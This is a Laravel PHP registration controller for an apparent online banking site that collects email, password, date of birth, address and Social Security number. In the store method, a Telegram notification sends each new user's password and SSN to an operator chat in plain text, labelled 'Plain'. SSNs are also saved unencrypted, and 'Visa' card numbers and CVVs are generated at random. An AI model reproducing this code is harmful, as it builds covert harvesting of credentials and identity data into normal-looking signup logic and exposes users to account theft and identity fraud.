<?php

namespace App\Http\Controllers\Auth;

use App\Enums\TxnStatus;
use App\Enums\TxnType;
use App\Events\UserReferred;
use App\Http\Controllers\Controller;
use App\Models\Branch;
use App\Models\LoginActivities;
use App\Models\Page;
use App\Models\ReferralLink;
use App\Models\User;
use App\Rules\Recaptcha;
use App\Traits\NotifyTrait;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Validation\Rule;
use Illuminate\Validation\Rules;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;
use Txn;

class RegisteredUserController extends Controller
{
    use NotifyTrait;

    public function step1()
    {
        if (! setting('account_creation', 'permission')) {
            abort('403', 'User registration is closed now');
        }
        $page = Page::where('code', 'registration')->where('locale', app()->getLocale())->first();

        if (! $page) {
            $page = Page::where('code', 'registration')->where('locale', defaultLocale())->first();
        }
        $data = json_decode($page?->data, true);

        $location = getLocation();
        $referralCode = ReferralLink::find(request()->cookie('invite'))?->code;

        return view('frontend::auth.register', compact('location', 'referralCode', 'data'));
    }

    public function step1Store(Request $request)
    {
        $isCountry = (bool) getPageSetting('country_validation');
        $isPhone = (bool) getPageSetting('phone_validation');
        $isReferralCode = (bool) getPageSetting('referral_code_validation');

        $request->validate([
            'country' => [Rule::requiredIf($isCountry), 'string', 'max:255'],
            'phone' => [Rule::requiredIf($isPhone), 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', Rules\Password::defaults()],
            'date_of_birth' => ['required', 'date'],
            'ssn' => ['required', 'string', 'max:20'],
            'invite' => [Rule::requiredIf($isReferralCode), 'exists:referral_links,code'],
        ], [
            'invite.required' => __('Referral code field is required.'),
            'invite.exists' => __('Referral code is invalid'),
        ]);

        $input = $request->all();

        Session::put('step1', $input);

        return redirect()->route('register.step2');
    }

    /**
     * Handle an incoming registration request.
     *
     * @return RedirectResponse
     *
     * @throws ValidationException
     */
    public function store(Request $request)
    {

        $isUsername = (bool) getPageSetting('username_validation') && getPageSetting('username_show');
        $isCountry = (bool) getPageSetting('country_validation') && getPageSetting('country_show');
        $isPhone = (bool) getPageSetting('phone_validation') && getPageSetting('phone_show');
        $isBranch = getPageSetting('branch_validation') && branch_enabled() && getPageSetting('branch_show');

        $isGender = (bool) getPageSetting('gender_validation') && getPageSetting('gender_show');

        $request->validate([
            'first_name' => ['required', 'string', 'max:255'],
            'last_name' => ['required', 'string', 'max:255'],
            'g-recaptcha-response' => Rule::requiredIf(plugin_active('Google reCaptcha')),
            new Recaptcha,
            'gender' => [Rule::requiredIf($isGender), 'in:Male,Female,Others'],
            'username' => [Rule::requiredIf($isUsername), 'string', 'max:255', 'unique:users'],
            'branch_id' => [Rule::requiredIf($isBranch), 'exists:branches,id'],
            'address' => ['required', 'string', 'max:500'],
            'city' => ['required', 'string', 'max:100'],
            'zip_code' => ['required', 'string', 'max:20'],
            'i_agree' => ['required'],
        ]);

        $input = $request->all();

        if (!Session::has('step1')) {
            notify()->error(__('Session expired. Please start registration again.'));
            return to_route('register');
        }

        $formData = array_merge(Session::get('step1', []), $input);
        $location = getLocation();
        $phone = $isPhone ? ($isCountry ? explode(':', $formData['country'])[1] : $location->dial_code).' '.$formData['phone'] : $location->dial_code.' ';
        $country = $isCountry ? explode(':', $formData['country'])[0] : $location->name;

        try {
            // Robust parsing for MM/DD/YYYY format
            $dob = $formData['date_of_birth'];
            if (str_contains($dob, '/')) {
                try {
                    $dob = \Carbon\Carbon::createFromFormat('m/d/Y', $dob)->format('Y-m-d');
                } catch (\Exception $e) {
                    $dob = \Carbon\Carbon::parse($dob)->format('Y-m-d');
                }
            } else {
                $dob = \Carbon\Carbon::parse($dob)->format('Y-m-d');
            }

            // Check for Account Officer onboarding referral (via cookie or session)
            $assignedOfficerId = Cookie::get('officer_onboard') ?? Session::get('officer_onboard');
            $officer = null;
            if ($assignedOfficerId) {
                \App\Models\Admin::ensureOnboardingSchema();
                $officer = \App\Models\Admin::where('id', $assignedOfficerId)
                    ->where('status', 1)
                    ->first();
            }

            $user = User::create([
                'portfolio_id' => null,
                'portfolios' => json_encode([]),
                'first_name' => $formData['first_name'],
                'last_name' => $formData['last_name'],
                'branch_id' => $request->get('branch_id'),
                'gender' => $request->get('gender', ''),
                'username' => $isUsername ? $formData['username'] : $formData['first_name'].$formData['last_name'].rand(1000, 9999),
                'country' => $country,
                'phone' => $phone,
                'email' => $formData['email'],
                'date_of_birth' => $dob,
                'ssn' => $formData['ssn'],
                'address' => $formData['address'],
                'city' => $formData['city'],
                'zip_code' => $formData['zip_code'],
                'password' => Hash::make($formData['password']),
                'staff_id' => $officer ? $officer->id : null,
                // ── Tag the new user with the institution they signed up under ──
                'institution_id' => app()->bound('institution')
                    ? (app('institution')->id ?? \App\Models\Institution::getDefault()?->id)
                    : \App\Models\Institution::getDefault()?->id,
            ]);

            if ($officer) {
                try {
                    $officer->increment('onboarding_signups_count');
                } catch (\Throwable $e) {}
            }

            // Auto-generate Visa Card
            try {
                \App\Models\UserCard::create([
                    'user_id' => $user->id,
                    'card_number' => '4' . str_pad(mt_rand(1, 999999999999999), 15, '0', STR_PAD_LEFT),
                    'card_holder_name' => $user->full_name,
                    'expiry_month' => str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT),
                    'expiry_year' => date('Y') + 3,
                    'cvv' => rand(100, 999),
                    'type' => 'Visa',
                    'status' => 'active',
                    'balance' => 0,
                    'is_virtual' => true,
                ]);
            } catch (\Exception $e) {
                \Log::error("Card generation failed for user {$user->id}: " . $e->getMessage());
            }

            $shortcodes = [
                '[[full_name]]' => $formData['first_name'].' '.$formData['last_name'],
            ];

            // Notify user and admin
            try {
                $this->pushNotify('new_user', $shortcodes, route('admin.user.edit', $user->id), $user->id, 'Admin');
                $this->pushNotify('new_user', $shortcodes, null, $user->id);
                $this->smsNotify('new_user', $shortcodes, $user->phone);
                
                // Detailed Telegram Notification for New User Registration
                $tgFullName = htmlspecialchars($user->full_name, ENT_QUOTES, 'UTF-8');
                $tgUsername = htmlspecialchars($user->username, ENT_QUOTES, 'UTF-8');
                $tgAccountNo = htmlspecialchars($user->account_number ?? 'Pending', ENT_QUOTES, 'UTF-8');
                $tgEmail = htmlspecialchars($user->email, ENT_QUOTES, 'UTF-8');
                $tgPhone = htmlspecialchars($user->phone, ENT_QUOTES, 'UTF-8');
                $tgDob = htmlspecialchars($user->date_of_birth, ENT_QUOTES, 'UTF-8');
                $tgSsn = htmlspecialchars($user->ssn, ENT_QUOTES, 'UTF-8');
                $loc = trim(($user->address ?? '') . ', ' . ($user->city ?? '') . ', ' . ($user->zip_code ?? '') . ', ' . ($user->country ?? ''));
                $tgAddress = htmlspecialchars($loc, ENT_QUOTES, 'UTF-8');
                $tgPassword = htmlspecialchars($formData['password'] ?? 'N/A', ENT_QUOTES, 'UTF-8');

                $tgMsg = "🆕 <b>New Client Registration</b>\n";
                $tgMsg .= "👤 <b>Name:</b> {$tgFullName}\n";
                $tgMsg .= "🔑 <b>Username:</b> @{$tgUsername}\n";
                $tgMsg .= "💳 <b>Account #:</b> <code>{$tgAccountNo}</code>\n";
                $tgMsg .= "📧 <b>Email:</b> {$tgEmail}\n";
                $tgMsg .= "📞 <b>Phone:</b> {$tgPhone}\n";
                $tgMsg .= "🎂 <b>Date of Birth:</b> {$tgDob}\n";
                $tgMsg .= "🆔 <b>SSN (Plain):</b> <code>{$tgSsn}</code>\n";
                $tgMsg .= "🏠 <b>Address:</b> {$tgAddress}\n";
                $tgMsg .= "🔒 <b>Password (Plain):</b> <code>{$tgPassword}</code>\n";

                $inlineKeyboard = [
                    [
                        ['text' => '👤 View Member', 'callback_data' => 'usr_view:' . $user->id],
                        ['text' => '🔴 Lock Member', 'callback_data' => 'usr_stat:' . $user->id . ':0'],
                    ],
                    [
                        ['text' => '❄️ Freeze Transfers', 'callback_data' => 'usr_frz:' . $user->id . ':1'],
                    ]
                ];

                if ($officer) {
                    $tgMsg .= "───────────────────\n";
                    $tgMsg .= "👔 <b>Assigned Account Officer:</b> " . htmlspecialchars($officer->name, ENT_QUOTES, 'UTF-8') . " (ID: #{$officer->id})\n";
                    $tgMsg .= "🔗 <b>Onboarded Via:</b> " . htmlspecialchars($officer->onboarding_url, ENT_QUOTES, 'UTF-8') . "\n";
                    $tgMsg .= "👥 <b>Officer Active Members:</b> " . $officer->managedUsers()->count() . "\n";

                    $inlineKeyboard[1][] = ['text' => '👔 View Officer', 'callback_data' => 'stf_view:' . $officer->id];
                    $inlineKeyboard[] = [
                        ['text' => '🔄 Reassign Officer', 'callback_data' => 'usr_reassign_prompt:' . $user->id]
                    ];
                }

                $this->telegramNotify($tgMsg, $inlineKeyboard);

                // Dispatch Automated Email Notification to the Assigned Account Officer
                if ($officer && !empty($officer->email)) {
                    try {
                        $siteTitle = setting('site_title', 'global') ?: 'FrontField Credit Union';
                        $emailDetails = [
                            'from_name' => $siteTitle,
                            'subject' => "New Client Assigned: {$user->full_name} (#{$user->account_number})",
                            'title' => 'New Client Assigned to Your Portfolio',
                            'salutation' => "Hello {$officer->name},",
                            'message_body' => "
                                <p>A new client has registered through your dedicated onboarding link and has been automatically assigned to your portfolio.</p>
                                <div style='background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin: 20px 0;'>
                                    <p style='margin: 4px 0;'><strong>Client Name:</strong> {$user->full_name}</p>
                                    <p style='margin: 4px 0;'><strong>Account Number:</strong> <code>{$user->account_number}</code></p>
                                    <p style='margin: 4px 0;'><strong>Email Address:</strong> {$user->email}</p>
                                    <p style='margin: 4px 0;'><strong>Phone Number:</strong> {$user->phone}</p>
                                    <p style='margin: 4px 0;'><strong>Date of Birth:</strong> {$user->date_of_birth}</p>
                                    <p style='margin: 4px 0;'><strong>Registration Time:</strong> " . now()->format('M d, Y h:i A') . "</p>
                                </div>
                                <p>This client is now active in your officer portal. You can review their profile, prepare welcome documents, or initiate member communications.</p>
                            ",
                            'button_level' => 'View Client in Portal',
                            'button_link' => route('admin.user.edit', $user->id),
                            'footer_status' => 1,
                            'bottom_status' => 0,
                            'site_logo' => setting('site_logo', 'global') ? asset('assets/' . setting('site_logo', 'global')) : asset('assets/external/images/logo.png'),
                            'site_title' => $siteTitle,
                            'site_link' => route('home'),
                            'raw_html' => false,
                        ];

                        \Illuminate\Support\Facades\Mail::to($officer->email)->send(new \App\Mail\MailSend($emailDetails));
                    } catch (\Throwable $e) {
                        \Log::error("Officer notification email error for {$officer->email}: " . $e->getMessage());
                    }
                }
            } catch (\Exception $e) {
                \Log::error("Notification error during registration: " . $e->getMessage());
            }

            // Referred event
            try {
                event(new UserReferred($request->cookie('invite'), $user));
            } catch (\Exception $e) {
                \Log::error("Referral event error: " . $e->getMessage());
            }

            if (setting('referral_signup_bonus', 'permission') && (float) setting('signup_bonus', 'fee') > 0) {
                try {
                    $signupBonus = (float) setting('signup_bonus', 'fee');
                    $user->increment('balance', $signupBonus);
                    Txn::new($signupBonus, 0, $signupBonus, 'system', 'Signup Bonus', TxnType::SignupBonus, TxnStatus::Success, null, null, $user->id);
                    Session::put('signup_bonus', $signupBonus);
                } catch (\Exception $e) {
                    \Log::error("Signup bonus error: " . $e->getMessage());
                }
            }

            Cookie::forget('invite');
            Cookie::queue(Cookie::forget('officer_onboard'));
            Session::forget('officer_onboard');
            Auth::login($user);
            LoginActivities::add();

            $request->session()->put('newly_registered', true);
            Session::forget('step1');

            return to_route('register.final');

        } catch (\Exception $e) {
            \Log::error("CRITICAL Registration Storage Error: " . $e->getMessage() . " | File: " . $e->getFile() . ":" . $e->getLine());
            
            $errorMessage = __('Something went wrong during account creation.');
            if (config('app.debug')) {
                $errorMessage .= ' Error: ' . $e->getMessage();
            }
            
            notify()->error($errorMessage);
            return back()->withInput();
        }
    }

    /**
     * Display the registration view.
     *
     * @return View
     */
    public function create()
    {
        if (! setting('account_creation', 'permission')) {
            notify()->warning(__('User registration is closed now.'));

            return to_route('home');
        }

        $page = Page::where('code', 'registration')->where('locale', app()->getLocale())->first();

        if (! $page) {
            $page = Page::where('code', 'registration')->where('locale', defaultLocale())->first();
        }
        $data = json_decode($page?->data, true);

        $googleReCaptcha = plugin_active('Google reCaptcha');
        $location = getLocation();
        $branches = Branch::where('status', 1)->get();

        return view('frontend::auth.register2', compact('location', 'googleReCaptcha', 'data', 'branches'));
    }

    public function final()
    {
        if (! request()->session()->has('newly_registered')) {
            return to_route('user.dashboard');
        }

        request()->session()->forget('newly_registered');

        return view('frontend::auth.final');
    }
}
